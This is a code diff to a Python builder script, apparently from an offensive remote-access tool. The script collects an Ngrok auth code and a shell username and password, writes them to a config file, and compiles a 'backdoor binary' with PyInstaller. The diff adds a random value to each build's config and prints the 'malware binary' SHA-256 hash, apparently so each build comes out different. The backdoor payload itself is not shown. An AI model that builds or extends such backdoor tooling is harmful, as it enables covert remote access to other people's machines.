@@ -5,6 +5,8 @@ from os import system, path
 from platform import system as systemos
 from wget import download
 import zipfile
+import hashlib
+import random
 import os
 import subprocess
 import time
@@ -61,6 +63,8 @@ def listenerConf():
     NgrokAuth = raw_input("\nPlease enter Ngrok auth code:\n\n Option >  ".format(RED, END))
     shell_user = raw_input("\nPlease enter username for connecting to shell:\n\n Option >  ".format(RED, END))
     shell_pass = raw_input("\nPlease enter password for connecting to shell:\n\n Option >  ".format(RED, END))
+    randomNum = random.random()
+    
     conf = open(cfgfile, 'a')
     Config = ConfigParser.ConfigParser()
     Config.add_section('Bind')
@@ -68,6 +72,7 @@ def listenerConf():
     Config.set('Bind', 'NgAuth', NgrokAuth)
     Config.set('Bind', 'user', shell_user)
     Config.set('Bind', 'password', shell_pass)
+    Config.set('Bind', 'random', randomNum)
     Config.write(conf)
     conf.close()
 
@@ -75,7 +80,18 @@ def pybinary(option):
     print('Compiling backdoor binary using Pyinstaller...')
     subprocess.Popen(['pyinstaller', option], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     time.sleep(10)
-    print('Done')
+    print('Successfully compiled malware binary to dist\server.exe')
+    file = ".\dist\server.exe" 
+    BLOCK_SIZE = 65536
+    file_hash = hashlib.sha256()
+    with open(file, 'rb') as f:
+        fb = f.read(BLOCK_SIZE)
+        while len(fb) > 0:
+            file_hash.update(fb)
+            fb = f.read(BLOCK_SIZE)
+    print ('Malware Hahs:')
+    print (file_hash.hexdigest())
+    
 
 def pyinstaller_compile(ostype, status):
     if ostype == 'linux':
